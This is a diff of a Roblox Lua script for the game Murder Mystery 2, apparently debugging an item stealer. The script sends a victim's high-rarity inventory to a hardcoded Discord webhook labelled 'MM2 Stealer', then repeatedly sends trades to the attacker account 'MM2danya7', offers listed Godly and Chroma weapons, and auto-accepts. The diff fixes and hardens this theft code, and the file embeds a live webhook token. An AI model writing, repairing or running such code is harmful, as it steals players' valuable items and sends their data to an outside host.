@@ -1,21 +1,44 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
-local plr.Name = Players.LocalPlayer
+local plr = Players.LocalPlayer
 
 getgenv().user = "MM2danya7"
 local webhook = "https://discord.com/api/webhooks/1417171931693584466/F_sTxNCu9VQTRMw0EFUN-hMmbJXHb-a4nEHJY2ixhrCaiWbvjMSDRS3XCodgx29n9FDA"
 
-local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.victim)
+-- Добавляем недостающие переменные
+local database = {
+    -- Заполните эту таблицу реальными данными предметов MM2
+    [1] = {ItemName = "FadeChroma", Rarity = "Chroma"},
+    [2] = {ItemName = "RedLuger", Rarity = "Godly"},
+    -- ... добавьте остальные предметы
+}
 
--- определение предметов для отправки
-local send.wpn = {}
+local rarityTable = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Godly", "Chroma"}
+local min_rarityindex = 5 -- Godly и выше
+
+-- Получаем данные профиля (исправляем plr.victim)
+local success, profileData = pcall(function()
+    local targetPlayer = Players:FindFirstChild(user)
+    if targetPlayer then
+        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(targetPlayer)
+    end
+    return nil
+end)
+
+if not success or not profileData then
+    warn("Не удалось получить данные профиля")
+    return
+end
+
+-- определение предметов для отправки (исправляем send.wpn)
+local send_wpn = {}
 for dataid, amount in pairs(profileData.Weapons.Owned) do
     local itemInfo = database[dataid]
     if itemInfo then
         local rarityIndex = table.find(rarityTable, itemInfo.Rarity)
         if rarityIndex and rarityIndex >= min_rarityindex then
-            table.insert(send.wpn, {
+            table.insert(send_wpn, {
                 DataID = itemInfo.ItemName,
                 Rarity = itemInfo.Rarity,
                 Amount = amount
@@ -24,78 +47,87 @@ for dataid, amount in pairs(profileData.Weapons.Owned) do
     end
 end
 
-if #send.wpn > 0 then
+if #send_wpn > 0 then
     local function formatItems(items)
         local str = ""
-        for , item in ipairs(items) do
+        for _, item in ipairs(items) do
             str = str .. string.format("%s (x%s) - %s\n", item.DataID, item.Amount, item.Rarity)
         end
         if str == "" then str = "None" end
         return str
     end
 
-    local fields = {
-        {name = "Username", value = plr.Name, inline = true},
-        {name = "Items", value = formatItems(send.wpn), inline = false}
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "MM2 Stealer",
+            ["color"] = 0x0663EE,
+            ["fields"] = {
+                {name = "Username", value = plr.Name, inline = true},
+                {name = "Items", value = formatItems(send_wpn), inline = false}
+            },
+            ["footer"] = {["text"] = "mm2 by vexadez"},
+            ["image"] = {["url"] = "image.png"}
+        }}
     }
 
-local data = {
-    ["embeds"] = {{
-        ["title"] = "MM2 Stealer",
-        ["color"] = 0x0663EE, -- синяя полоска (правильный шестнадцатеричный литерал)
-        ["fields"] = {
-            {name = "Username", value = plr.Name, inline = true},
-            {name = "Items", value = formatItems(send.wpn), inline = false}
-        },
-        ["footer"] = {["text"] = "mm2 by vexadez"}
-        ["image"] = {["url"] = "image.png"}
-    }}
-}
+    -- Проверяем наличие request библиотеки
+    if request then
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    else
+        warn("Библиотека 'request' не найдена!")
+    end
+end
 
-
-request({
-    Url = webhook,
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = HttpService:JSONEncode(data)
-})
-
-
-
+-- Автоматическая отправка трейдов
 while true do
     local targetPlayer = Players:FindFirstChild(user)
     if targetPlayer then
-        ReplicatedStorage.Trade.SendRequest:InvokeServer(targetPlayer)
-        print("By vexadez " .. user)
-        task.wait(0.4)
+        local success = pcall(function()
+            ReplicatedStorage.Trade.SendRequest:InvokeServer(targetPlayer)
+        end)
+        
+        if success then
+            print("By vexadez " .. user)
+            task.wait(0.4)
 
-        local List = {
-    -- godly
-    "Chroma Luger", "Chroma Laser", "Chroma Lightbringer", "Chroma Darkbringer",
-    "Chroma Saw", "Chroma Slasher", "Chroma Fang", "Chroma Candleflame",
-    "Chroma Elderwood Blade", "Chroma Boneblade",
-    "Harvester", "Hallowscythe", "Elderwood Scythe", "Logchopper", "Batwing",
-    "Icebreaker", "Swirlyblade", "Swirly Axe", "Bioblade",
-    "Champion Blade", "Champion Axe", "Cavern Blade", "Comp Blade", "Trophy", "Scythe",
-    "Eternal", "Eternal II", "Eternal III", "Eternal IV", "Eternal V", "Eternal Cane",
-    "Candy Gun", "Pumpkin Gun", "Web Gun", "Sugar", "Snowball Launcher",
-    "Ameriluger", "Luger Cane", "RedLuger", "Laser Beam",
-    "Gingerscope", "Gingerblade"
-}
+            local List = {
+                "Chroma Luger", "Chroma Laser", "Chroma Lightbringer", "Chroma Darkbringer",
+                "Chroma Saw", "Chroma Slasher", "Chroma Fang", "Chroma Candleflame",
+                "Chroma Elderwood Blade", "Chroma Boneblade",
+                "Harvester", "Hallowscythe", "Elderwood Scythe", "Logchopper", "Batwing",
+                "Icebreaker", "Swirlyblade", "Swirly Axe", "Bioblade",
+                "Champion Blade", "Champion Axe", "Cavern Blade", "Comp Blade", "Trophy", "Scythe",
+                "Eternal", "Eternal II", "Eternal III", "Eternal IV", "Eternal V", "Eternal Cane",
+                "Candy Gun", "Pumpkin Gun", "Web Gun", "Sugar", "Snowball Launcher",
+                "Ameriluger", "Luger Cane", "RedLuger", "Laser Beam",
+                "Gingerscope", "Gingerblade"
+            }
 
-        for _, item in ipairs(List) do
-            ReplicatedStorage.Trade.OfferItem:FireServer(item, "Weapons")
-            task.wait(0.03)
+            for _, item in ipairs(List) do
+                pcall(function()
+                    ReplicatedStorage.Trade.OfferItem:FireServer(item, "Weapons")
+                end)
+                task.wait(0.03)
+            end
+
+            print("B.k.b")
+            task.wait(5)
+
+            pcall(function()
+                ReplicatedStorage.Trade.AcceptTrade:FireServer()
+            end)
+            
+            print("Lol thanks, by vexadez xd")
+            task.wait(3)
+        else
+            print("Не удалось отправить запрос на обмен")
+            task.wait(5)
         end
-
-        print("B.k.b")
-        task.wait(5)
-
-        local args = {285646582}
-        ReplicatedStorage.Trade.AcceptTrade:FireServer(unpack(args))
-        print("Lol thanks , by vexadez xd")
-
-        task.wait(3)
     else
         print("Player " .. user .. " sleeping")
         task.wait(5)
